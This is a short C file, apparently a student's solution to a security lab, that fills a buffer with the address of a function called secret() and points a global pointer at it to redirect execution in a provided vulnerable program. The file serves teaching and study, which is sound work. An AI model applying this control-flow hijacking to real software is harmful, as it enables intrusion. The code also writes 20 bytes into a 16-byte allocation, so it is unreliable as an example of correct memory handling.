#include <stdlib.h>
#include "vulnerable.h"
#include <string.h>

void init() {
	/* FILL THIS IN */
	
	void *temp = (void*)secret; // storing the address of secret() in temp
	char *str = malloc(sizeof(char)*16); //creating a string to store repeated "temp"
	
	//Creating a large string with the address of
	//secret() repeated again and again
	memcpy(str, &temp, 4);
	memcpy(str+4,&temp, 4);
	memcpy(str+8,&temp, 4);
	memcpy(str+12,&temp, 4);
	memcpy(str+16,&temp, 4);

	//Changing name to point to this new string! which calls secret()
	name = str;
}

